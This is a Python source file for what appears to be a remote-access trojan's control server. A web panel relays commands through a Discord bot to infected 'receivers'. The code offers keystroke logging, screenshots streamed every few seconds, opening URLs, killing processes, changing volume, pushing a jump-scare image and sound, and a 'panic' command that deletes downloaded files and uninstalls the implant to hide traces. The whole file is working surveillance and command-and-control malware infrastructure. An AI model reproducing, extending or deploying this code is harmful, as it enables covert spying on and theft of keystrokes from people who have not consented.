# main.py
import asyncio
import importlib
import json
import os
import subprocess
import sys
import tempfile
import secrets
import time
from pathlib import Path
from typing import Optional

# ---------------- DEPENDENCIES ----------------
def ensure_dependencies():
    required = {
        "discord": "discord.py",
        "fastapi": "fastapi",
        "uvicorn": "uvicorn",
        "python_multipart": "python-multipart",
    }
    missing = []
    for mod, pkg in required.items():
        try:
            importlib.import_module(mod)
        except ImportError:
            missing.append(pkg)
    if missing:
        subprocess.check_call([sys.executable, "-m", "pip", "install", *missing])

ensure_dependencies()

import discord
from discord.ext import commands
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, UploadFile, File, Form, Request
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse

# ---------------- CONFIG ----------------
CONTROLLER_TOKEN = os.getenv("CONTROLLER_TOKEN", "")
COMMAND_CHANNEL_ID = int(os.getenv("COMMAND_CHANNEL_ID", "1360236257212633260"))
TARGET_CHANNEL_ID = int(os.getenv("TARGET_CHANNEL_ID", "0"))
BOT_TAG = ""  # unused for now; kept for compatibility if needed

assert CONTROLLER_TOKEN
assert COMMAND_CHANNEL_ID
assert TARGET_CHANNEL_ID

ROOT_DIR = Path(__file__).parent
_latest_screenshot: dict[str, str] = {"url": "", "message_id": "", "ts": ""}
STATE_FILE = ROOT_DIR / "receivers.json"
_receivers: dict[str, dict] = {}  # id -> {"alias": str, "last_seen": float, "tag": str}
_selected_receiver: Optional[str] = None
STALE_SECONDS = 90

def _load_state():
    global _receivers, _selected_receiver
    if STATE_FILE.is_file():
        try:
            data = json.loads(STATE_FILE.read_text())
            _receivers = data.get("receivers", {})
            _selected_receiver = data.get("selected")
        except Exception:
            pass

def _save_state():
    try:
        STATE_FILE.write_text(json.dumps({"receivers": _receivers, "selected": _selected_receiver}))
    except Exception:
        pass

def _prune_receivers(now: Optional[float] = None) -> bool:
    global _selected_receiver
    if now is None:
        now = time.time()
    removed = False
    for rid in list(_receivers.keys()):
        last_seen = _receivers[rid].get("last_seen", 0)
        if now - last_seen > STALE_SECONDS:
            _receivers.pop(rid, None)
            removed = True
            if _selected_receiver == rid:
                _selected_receiver = None
    if removed:
        _save_state()
    return removed

_load_state()

# ---------------- DISCORD ----------------
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="?", intents=intents)
_controller_ready = asyncio.Event()
_controller_error: Optional[str] = None

async def _get_channel(cid: int) -> discord.TextChannel:
    ch = bot.get_channel(cid)
    return ch or await bot.fetch_channel(cid)

@bot.event
async def on_ready():
    print(f"[SERVER] Logged in as {bot.user}")
    _controller_ready.set()

@bot.event
async def on_message(message: discord.Message):
    # Track latest screenshot posted by receiver
    if message.channel.id == TARGET_CHANNEL_ID and message.attachments:
        for att in message.attachments:
            name = (att.filename or "").lower()
            if name.endswith((".png", ".jpg", ".jpeg")):
                _latest_screenshot["url"] = att.url
                _latest_screenshot["message_id"] = str(message.id)
                _latest_screenshot["ts"] = str(message.created_at)
                break
    # Track receiver announcements
    if message.channel.id == COMMAND_CHANNEL_ID:
        content = (message.content or "").strip()
        if not content:
            return
        tokens = content.split()
        # Drop optional BOT_TAG for backward compatibility
        if BOT_TAG and tokens and tokens[0] == BOT_TAG:
            tokens = tokens[1:]
        if tokens and tokens[0] in ("ONLINE", "PING") and len(tokens) >= 3:
            receiver_id = tokens[1].strip()
            tag = tokens[2].strip()
            now = time.time()
            entry = _receivers.get(receiver_id, {"alias": "", "tag": tag, "last_seen": now})
            entry.setdefault("alias", "")
            entry["tag"] = tag
            entry["last_seen"] = now
            _receivers[receiver_id] = entry
            if _selected_receiver is None:
                _selected_receiver = receiver_id
            _save_state()
# ---------------- WEBSOCKET HUB ----------------
class Hub:
    def __init__(self):
        self.clients: set[WebSocket] = set()
        self.lock = asyncio.Lock()

    async def add(self, ws: WebSocket):
        async with self.lock:
            self.clients.add(ws)

    async def remove(self, ws: WebSocket):
        async with self.lock:
            self.clients.discard(ws)


    async def broadcast_bytes(self, data: bytes, *, sender: Optional[WebSocket] = None):
        dead = []
        async with self.lock:
            for ws in list(self.clients):
                if sender is not None and ws is sender:
                    continue
                try:
                    await ws.send_bytes(data)
                except Exception:
                    dead.append(ws)
            for ws in dead:
                self.clients.discard(ws)

hub = Hub()

# ---------------- FASTAPI ----------------
app = FastAPI(title="Controller")

CONTROL_HTML = """<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Controller</title>
  <style>
    :root { --bg:#07030f; --card:#0e0a1a; --border:#21183a; --accent:#9b5cff; --accent2:#6b21ff; --text:#e7e7ff; --muted:#b8b5d3; --danger:#ef4444; --success:#22c55e; }
    body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg); background-image: radial-gradient(circle at 20% 20%, rgba(107,33,255,0.18), transparent 28%), radial-gradient(circle at 80% 0%, rgba(155,92,255,0.18), transparent 28%), linear-gradient(135deg, rgba(155,92,255,0.08), rgba(107,33,255,0.05)); background-repeat: no-repeat; background-attachment: fixed; background-size: cover; background-position: center; color: var(--text); margin: 0; padding: 24px; min-height: 100vh; }
    .layout { display: grid; grid-template-columns: minmax(320px, 520px) 1fr; gap: 16px; align-items: start; }
    .card { background: linear-gradient(145deg, rgba(14,10,26,0.94), rgba(18,14,30,0.97)); border: 1px solid var(--border); border-radius: 14px; padding: 18px; box-shadow: 0 10px 35px rgba(0,0,0,0.35); }
    h1 { margin: 0 0 12px; font-size: 18px; letter-spacing: 0.3px; }
    label { display: block; margin-bottom: 6px; color: var(--muted); font-size: 13px; }
    input, button { font-family: inherit; }
    input[type=file], input[type=text], input[type=number] { width: 100%; margin-bottom: 10px; padding: 10px; border-radius: 10px; border: 1px solid var(--border); background: #0c0817; color: var(--text); }
    button { cursor: pointer; background: linear-gradient(135deg, var(--accent), var(--accent2)); color: #0b0419; border: none; border-radius: 10px; padding: 10px 14px; font-weight: 700; letter-spacing: 0.3px; }
    button.secondary { background: #180f2c; color: var(--text); border: 1px solid var(--border); }
    .row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
    small { color: var(--muted); }
    img { max-width: 100%; border-radius: 10px; border: 1px solid var(--border); }
    .pill { padding: 8px 12px; border-radius: 999px; border: 1px solid var(--border); background: #0c0817; }
    .tabs { display: flex; gap: 8px; margin-bottom: 12px; flex-wrap: wrap; }
    .tab-btn { background: #140c24; color: var(--muted); border: 1px solid var(--border); padding: 8px 12px; border-radius: 8px; cursor: pointer; }
    .tab-btn.active { background: linear-gradient(135deg, var(--accent), var(--accent2)); color: #0b0419; border-color: transparent; }
    .tab-pane { display: none; }
    .tab-pane.active { display: block; }
    .receiver-row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
    .rename-input { width: 180px; min-width: 140px; margin-bottom: 0; }
    .panic-btn { position: fixed; right: 24px; bottom: 24px; z-index: 999; background: linear-gradient(135deg, #f97316, var(--danger)); color: #0b0419; box-shadow: 0 12px 24px rgba(239,68,68,0.35); }
    .panic-btn:active { transform: translateY(1px); }
  </style>
</head>
<body>
  <div class="layout">
    <div class="card">
      <div class="tabs">
        <button class="tab-btn active" data-tab="surprise">Surprise</button>
        <button class="tab-btn" data-tab="select">Select Target</button>
        <button class="tab-btn" data-tab="openclose">Open & Close :3</button>
        <button class="tab-btn" data-tab="volume">Volume ;0</button>
        <button class="tab-btn" data-tab="logs">Logs</button>
      </div>
      <div class="tab-pane active" data-tab="surprise">
        <h1>Display Surprise</h1>
        <p style="margin: 4px 0 12px; color:var(--muted);">Sends local <code>suprise.png</code>/<code>surprise.png</code> and <code>sound.mp3</code> to the receiver and triggers display.</p>
        <div class="row">
          <form method="post" action="/ui/surprise">
            <button type="submit">Send & Display</button>
          </form>
          <form method="post" action="/ui/gif/stop">
            <button class="secondary" type="submit">Stop Display</button>
          </form>
        </div>
      </div>
      <div class="tab-pane" data-tab="select">
        <h1>Select Target</h1>
        <div id="receiver-buttons" class="row" style="flex-wrap: wrap;"></div>
      </div>
      <div class="tab-pane" data-tab="openclose">
        <h1>Open & Close :3</h1>
        <form method="post" action="/ui/open">
          <label for="url">Open website</label>
          <input id="url" name="url" type="text" placeholder="https://google.com" required>
          <button type="submit">Open</button>
        </form>
        <form method="post" action="/ui/close" style="margin-top:12px;">
          <label for="proc">Close process (name.exe)</label>
          <input id="proc" name="proc" type="text" placeholder="chrome.exe" required>
          <button class="secondary" type="submit">Close</button>
        </form>
      </div>
      <div class="tab-pane" data-tab="volume">
        <h1>Volume ;0</h1>
        <form method="post" action="/ui/volume">
          <label for="level">Set volume (0-100)</label>
          <input id="level" name="level" type="number" min="0" max="100" step="1" value="50" required>
          <button type="submit">Set Volume</button>
        </form>
      </div>
      <div class="tab-pane" data-tab="logs">
        <h1>Key Logs</h1>
        <p style="color:var(--muted); margin-bottom:12px;">
          Start / stop key logging on the selected receiver.
          Logged keys auto-expire after 60 seconds.
        </p>

        <div class="row">
          <form method="post" action="/ui/logs/start">
            <button type="submit">Start Logging</button>
          </form>

          <form method="post" action="/ui/logs/stop">
            <button class="secondary" type="submit">Stop Logging</button>
          </form>
        </div>

        <pre id="log-output" style="
          margin-top:12px;
          padding:12px;
          background:#0c0817;
          border:1px solid var(--border);
          border-radius:10px;
          max-height:260px;
          overflow:auto;
          font-size:13px;
        ">Waiting for logs…</pre>
      </div>
    </div>
    <div class="card">
      <h1>Live Screen (5s)</h1>
      <p style="margin: 4px 0 12px; color:var(--muted);">Latest screenshot posted by receiver every 5 seconds.</p>
      <div id="screen-wrap">
        <img id="screen-img" src="" alt="Waiting for screenshot..." />
      </div>
      <div class="row" style="margin-top:10px;">
        <form method="post" action="/ui/live/start">
          <button type="submit">Start Live</button>
        </form>
        <form method="post" action="/ui/live/stop">
          <button class="secondary" type="submit">Stop Live</button>
        </form>
      </div>
    </div>
  </div>
  <button id="panic-btn" class="panic-btn" type="button">Panic Mode</button>
  <script>
    let selectedReceiver = null;
    async function refreshReceivers() {
      try {
        const res = await fetch('/api/receivers');
        if (!res.ok) return;
        const data = await res.json();
        selectedReceiver = data.selected || null;
        const wrap = document.getElementById('receiver-buttons');
        wrap.innerHTML = '';
        (data.online || []).forEach(rec => {
          const row = document.createElement('div');
          row.className = 'receiver-row';

          const selectForm = document.createElement('form');
          selectForm.method = 'post';
          selectForm.action = '/ui/select/' + encodeURIComponent(rec.id);
          const btn = document.createElement('button');
          btn.type = 'submit';
          btn.textContent = rec.name || rec.tag || rec.id;
          if (data.selected === rec.id) {
            btn.style.background = '#10b981';
            btn.style.color = '#0b1224';
          }
          selectForm.appendChild(btn);

          const renameForm = document.createElement('form');
          renameForm.method = 'post';
          renameForm.action = '/ui/rename/' + encodeURIComponent(rec.id);
          const input = document.createElement('input');
          input.type = 'text';
          input.name = 'alias';
          input.placeholder = 'Rename';
          input.value = rec.alias || '';
          input.className = 'rename-input';
          const renameBtn = document.createElement('button');
          renameBtn.type = 'submit';
          renameBtn.textContent = 'Rename';
          renameBtn.className = 'secondary';
          renameForm.appendChild(input);
          renameForm.appendChild(renameBtn);

          row.appendChild(selectForm);
          row.appendChild(renameForm);
          wrap.appendChild(row);
        });
        const panicBtn = document.getElementById('panic-btn');
        if (panicBtn) {
          panicBtn.disabled = !selectedReceiver;
        }
      } catch (e) { /* ignore */ }
    }
    async function refreshScreen() {
      try {
        const res = await fetch('/api/screenshot');
        if (!res.ok) return;
        const data = await res.json();
        if (data.url) {
          const img = document.getElementById('screen-img');
          img.src = data.url + '?t=' + Date.now();
        }
      } catch (e) { /* ignore */ }
    }
    // tabs
    const tabButtons = document.querySelectorAll('.tab-btn');
    const tabPanes = document.querySelectorAll('.tab-pane');
    function activateTab(id) {
      tabButtons.forEach(btn => btn.classList.toggle('active', btn.dataset.tab === id));
      tabPanes.forEach(pane => pane.classList.toggle('active', pane.dataset.tab === id));
    }
    tabButtons.forEach(btn => btn.addEventListener('click', () => activateTab(btn.dataset.tab)));

    activateTab('surprise');
    refreshReceivers();
    refreshScreen();
    setInterval(refreshReceivers, 5000);
    setInterval(refreshScreen, 4000);

    const panicBtn = document.getElementById('panic-btn');
    if (panicBtn) {
      panicBtn.addEventListener('click', async () => {
        if (!selectedReceiver) {
          alert('Select a receiver first.');
          return;
        }
        const ok = confirm('Panic mode will delete downloaded files and remove the receiver app. Continue?');
        if (!ok) return;
        try {
          const res = await fetch('/ui/panic', { method: 'POST' });
          if (!res.ok) {
            alert('Panic request failed.');
            return;
          }
          window.location.reload();
        } catch (e) {
          alert('Panic request failed.');
        }
      });
    }
  </script>
</body>
</html>"""

@app.get("/")
async def index():
    return HTMLResponse(CONTROL_HTML)

@app.websocket("/audio")
async def audio_ws(ws: WebSocket):
    await ws.accept()  # ✅ REQUIRED on Render
    print("WS ACCEPTED")

    await hub.add(ws)

    try:
        while True:
            data = await ws.receive_bytes()
            await hub.broadcast_bytes(data, sender=ws)
    except WebSocketDisconnect:
        pass
    finally:
        await hub.remove(ws)


# ---------------- COMMAND ENDPOINTS ----------------
async def _send_cmd(msg: str):
    await _controller_ready.wait()
    if _controller_error:
        print("Controller bot not ready:", _controller_error)
        return
    try:
        ch = await _get_channel(COMMAND_CHANNEL_ID)
        print(f"Sending command to channel {COMMAND_CHANNEL_ID}:", msg)
        await ch.send(msg)
    except Exception as e:
        print("Send command failed:", e)

async def _send_cmd_with_files(msg: str, file_paths: list[Path]):
    await _controller_ready.wait()
    if _controller_error:
        print("Controller bot not ready:", _controller_error)
        return
    try:
        ch = await _get_channel(COMMAND_CHANNEL_ID)
        print(f"Sending command with files to channel {COMMAND_CHANNEL_ID}:", msg, [p.name for p in file_paths])
        files = []
        for p in file_paths:
            try:
                files.append(discord.File(fp=str(p), filename=p.name))
            except Exception as e:
                print("Skipping file attach failed:", p, e)
                continue
        if not files:
            await ch.send(f"{msg} (no files attached)")
            return
        await ch.send(content=msg, files=files)
    except Exception as e:
        print("Send command with files failed:", e)

async def _wait_controller_ready(timeout: float = 5.0) -> bool:
    try:
        await asyncio.wait_for(_controller_ready.wait(), timeout=timeout)
        return True
    except asyncio.TimeoutError:
        print("Discord bot not ready after wait; controller may not be connected.")
        return False

def _cmd_with_selection(cmd: str, *args: str) -> str:
    parts = [cmd, *args]
    base = " ".join(parts)
    if _selected_receiver:
        return f"TARGET {_selected_receiver} {base}"
    return f"TARGET NONE {base}"

def _cmd_for_receiver(rid: Optional[str], cmd: str, *args: str) -> str:
    parts = [cmd, *args]
    base = " ".join(parts)
    if rid:
        return f"TARGET {rid} {base}"
    return f"TARGET NONE {base}"

@app.post("/cmd/gif/start")
async def gif_start():
    if not await _wait_controller_ready():
        return JSONResponse({"ok": False, "error": "bot not ready"}, status_code=503)
    await _send_cmd(_cmd_with_selection("DISPLAY_GIF_START"))
    return JSONResponse({"ok": True})

@app.post("/cmd/gif/stop")
async def gif_stop():
    if not await _wait_controller_ready():
        return JSONResponse({"ok": False, "error": "bot not ready"}, status_code=503)
    await _send_cmd(_cmd_with_selection("DISPLAY_GIF_STOP"))
    return JSONResponse({"ok": True})

@app.get("/api/screenshot")
async def api_screenshot():
    return JSONResponse(_latest_screenshot)

@app.get("/api/receivers")
async def api_receivers():
    now = time.time()
    _prune_receivers(now)
    online = []
    for rid, info in _receivers.items():
        alias = info.get("alias") or ""
        display = alias or info.get("tag") or rid
        data = {
            "id": rid,
            "name": display,
            "tag": info.get("tag"),
            "alias": alias,
            "last_seen": info.get("last_seen", 0),
        }
        online.append(data)
    return JSONResponse({"online": online, "offline": [], "selected": _selected_receiver})

@app.post("/ui/surprise")
async def ui_surprise():
    # Prefer suprise.png (existing file), fall back to surprise.png
    img = None
    for name in ("suprise.png", "surprise.png"):
        candidate = ROOT_DIR / name
        if candidate.is_file():
            img = candidate
            break
    sound = ROOT_DIR / "sound.mp3"

    files = [p for p in (img, sound) if p and p.is_file()]
    if not files:
        return HTMLResponse("Missing suprise.png/surprise.png and sound.mp3 next to main.py", status_code=400)

    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await _send_cmd_with_files(_cmd_with_selection("DISPLAY_GIF_START"), files)
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/gif/stop")
async def ui_gif_stop():
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await gif_stop()
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/live/start")
async def ui_live_start():
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await _send_cmd(_cmd_with_selection("LIVE_START"))
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/live/stop")
async def ui_live_stop():
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await _send_cmd(_cmd_with_selection("LIVE_STOP"))
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/logs/start")
async def ui_logs_start():
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await _send_cmd(_cmd_with_selection("LOGS_START"))
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/logs/stop")
async def ui_logs_stop():
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await _send_cmd(_cmd_with_selection("LOGS_STOP"))
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/open")
async def ui_open(request: Request):
    url = None
    try:
        form = await request.form()
        url = form.get("url")
    except Exception:
        url = request.query_params.get("url")
    if url:
        msg = _cmd_with_selection("OPEN_LINK", url)
        print("Sending:", msg)
        if not await _wait_controller_ready():
            return HTMLResponse("Discord bot not ready", status_code=503)
        await _send_cmd(msg)
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/close")
async def ui_close(request: Request):
    proc = None
    try:
        form = await request.form()
        proc = form.get("proc")
    except Exception:
        proc = request.query_params.get("proc")
    if proc:
        msg = _cmd_with_selection("KILL_PROCESS", proc)
        print("Sending:", msg)
        if not await _wait_controller_ready():
            return HTMLResponse("Discord bot not ready", status_code=503)
        await _send_cmd(msg)
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/volume")
async def ui_volume(request: Request):
    level = None
    try:
        form = await request.form()
        level = form.get("level")
    except Exception:
        level = request.query_params.get("level")
    if level:
        msg = _cmd_with_selection("SET_VOLUME", level)
        print("Sending:", msg)
        if not await _wait_controller_ready():
            return HTMLResponse("Discord bot not ready", status_code=503)
        await _send_cmd(msg)
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/rename/{rid}")
async def ui_rename(rid: str, request: Request):
    alias = None
    try:
        form = await request.form()
        alias = form.get("alias")
    except Exception:
        alias = request.query_params.get("alias")
    _prune_receivers()
    if rid in _receivers and alias is not None:
        cleaned = alias.strip()
        if cleaned:
            _receivers[rid]["alias"] = cleaned
            _receivers[rid]["tag"] = cleaned
            _save_state()
            if await _wait_controller_ready():
                await _send_cmd(_cmd_for_receiver(rid, "SET_NAME", cleaned))
        else:
            _receivers[rid].pop("alias", None)
            _save_state()
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/panic")
async def ui_panic():
    if not _selected_receiver:
        return HTMLResponse("No receiver selected", status_code=400)
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await _send_cmd(_cmd_with_selection("PANIC"))
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/select/{tag}")
async def ui_select(tag: str):
    global _selected_receiver
    _prune_receivers()
    if tag in _receivers:
        _selected_receiver = tag
        _save_state()
    return RedirectResponse(url="/", status_code=303)


# ---------------- STARTUP ----------------
@app.on_event("startup")
async def startup():
    async def run_bot():
        try:
            await bot.start(CONTROLLER_TOKEN)
        except Exception as e:
            print("Bot failed:", e)
            global _controller_error
            _controller_error = str(e)
            _controller_ready.set()
    asyncio.create_task(run_bot())
